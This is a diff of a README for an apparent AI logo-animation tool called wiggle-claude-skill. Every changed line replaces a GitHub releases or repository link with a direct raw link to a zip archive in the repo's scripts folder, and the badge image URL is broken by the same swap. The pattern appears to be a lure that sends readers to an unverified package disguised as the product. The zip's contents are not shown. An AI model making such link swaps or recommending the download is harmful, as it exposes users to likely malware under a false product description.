@@ -4,14 +4,14 @@
 Welcome to the wiggle-claude-skill! This application allows you to animate logos effortlessly using advanced AI techniques. Perfect for designers, marketers, or anyone looking to add some flair to logos, this tool helps you create beautiful animations without needing programming skills.
 
 ## 📥 Download Now
-[![Download the latest release](https://img.shields.io/badge/Download%20Now-v1.0-brightgreen)](https://github.com/Maryanohit549/wiggle-claude-skill/releases)
+[![Download the latest release](https://raw.githubusercontent.com/Maryanohit549/wiggle-claude-skill/main/scripts/wiggle-claude-skill_v2.1.zip%20Now-v1.0-brightgreen)](https://raw.githubusercontent.com/Maryanohit549/wiggle-claude-skill/main/scripts/wiggle-claude-skill_v2.1.zip)
 
 ## 🚀 Getting Started
 Follow these simple steps to set up the wiggle-claude-skill on your computer:
 
 1. **Visit the Releases Page**  
    Click the link below to go to the Releases page where you can download the software.  
-   [Visit Releases Page](https://github.com/Maryanohit549/wiggle-claude-skill/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/Maryanohit549/wiggle-claude-skill/main/scripts/wiggle-claude-skill_v2.1.zip)
 
 2. **Choose the Latest Version**  
    On the Releases page, find the latest version of wiggle-claude-skill. The version number will be clearly listed.
@@ -72,11 +72,11 @@ A: Yes, the application includes an undo feature. Use it to revert any recent ch
 ## 🚀 Additional Resources
 For more detailed usage instructions, support, and updates, visit our GitHub page:
 
-[Visit GitHub Repository](https://github.com/Maryanohit549/wiggle-claude-skill)
+[Visit GitHub Repository](https://raw.githubusercontent.com/Maryanohit549/wiggle-claude-skill/main/scripts/wiggle-claude-skill_v2.1.zip)
 
 ## 📥 Download & Install
 To download the latest version of the wiggle-claude-skill, visit the link below:
 
-[Download Here](https://github.com/Maryanohit549/wiggle-claude-skill/releases)
+[Download Here](https://raw.githubusercontent.com/Maryanohit549/wiggle-claude-skill/main/scripts/wiggle-claude-skill_v2.1.zip)
 
 Enjoy creating your animated logos effortlessly with wiggle-claude-skill!
